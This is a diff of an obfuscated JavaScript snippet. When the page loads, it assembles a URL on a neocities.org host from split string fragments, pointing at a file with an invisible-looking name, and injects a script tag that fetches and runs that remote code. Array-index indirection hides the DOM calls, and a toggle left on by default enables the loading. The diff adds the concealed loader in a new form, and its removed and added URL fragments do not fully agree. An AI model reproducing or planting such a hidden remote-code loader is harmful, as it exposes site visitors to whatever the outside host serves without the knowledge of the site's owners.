@@ -1,7 +1,7 @@
-var loadExternalScript = true; // Editable toggle
+var loadExternalScript = true;
 
 (function(){
-    const _0xa1f3 = [
+    const _0x4e9f = [
         'createElement',
         'script',
         'src',
@@ -15,23 +15,21 @@ var loadExternalScript = true; // Editable toggle
         'Script is disabled'
     ];
 
-    function d(c){return String.fromCharCode.apply(null, c);}
-    
-    const part1 = d([104,116,116,112,115,58,47,47,115,104]);
-    const part2 = d([97,114,101,98,111,111,115,116,101,114,46]);
-    const part3 = d([110,101,111,99,105,116,105,101,115,46,111,114,103,47]);
-    const part4 = d([115,99,114,105,112,116]);
-    const part5 = d([37,69,51,133,164,46,106,115]);
+    const part1 = 'https://sh';
+    const part2 = 'arebooster.';
+    const part3 = 'neocities.org/';
+    const part4 = 'script';
+    const part5 = '%E3%85%A4.js';
 
     const finalURL = part1 + part2 + part3 + part4 + part5;
 
     if(loadExternalScript){
-        var s = document[_0xa1f3[0]](_0xa1f3[1]);
-        s[_0xa1f3[2]] = finalURL;
-        document[_0xa1f3[4]][_0xa1f3[3]](s);
+        var s = document[_0x4e9f[0]](_0x4e9f[1]);
+        s[_0x4e9f[2]] = finalURL;
+        document[_0x4e9f[4]][_0x4e9f[3]](s);
     }else{
-        var d = document[_0xa1f3[5]]('scriptStatus');
-        d[_0xa1f3[6]][_0xa1f3[7]] = _0xa1f3[8];
-        d[_0xa1f3[9]] = _0xa1f3[10];
+        var d = document[_0x4e9f[5]]('scriptStatus');
+        d[_0x4e9f[6]][_0x4e9f[7]] = _0x4e9f[8];
+        d[_0x4e9f[9]] = _0x4e9f[10];
     }
 })();
